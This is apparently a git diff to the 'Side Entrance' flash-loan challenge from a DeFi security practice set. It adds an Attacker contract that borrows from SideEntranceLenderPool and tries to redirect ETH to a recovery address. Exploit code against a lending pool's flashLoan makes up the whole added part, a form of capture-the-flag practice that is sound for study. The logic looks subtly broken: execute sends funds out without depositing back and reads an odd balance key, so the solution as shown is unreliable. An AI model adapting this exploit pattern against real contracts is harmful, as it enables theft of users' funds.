@@ -36,9 +36,27 @@ contract SideEntranceLenderPool {
         uint256 balanceBefore = address(this).balance;
 
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+        //msg.sender is an attacker contract so IFlashLoanEtherReceiver will be an attacker with execute function
 
         if (address(this).balance < balanceBefore) {
             revert RepayFailed();
         }
     }
 }
+
+
+contract Attacker {
+    SideEntranceLenderPool immutable pool;
+    address recovery;
+    
+    constructor(SideEntranceLenderPool _pool, address _recovery, uint256 amount) {
+        pool = _pool;
+        recovery = _recovery;
+        pool.flashLoan(amount);
+    }
+
+    function execute() external payable{
+        SafeTransferLib.safeTransferETH(recovery, pool.balances(address(pool)));
+    } 
+}
+
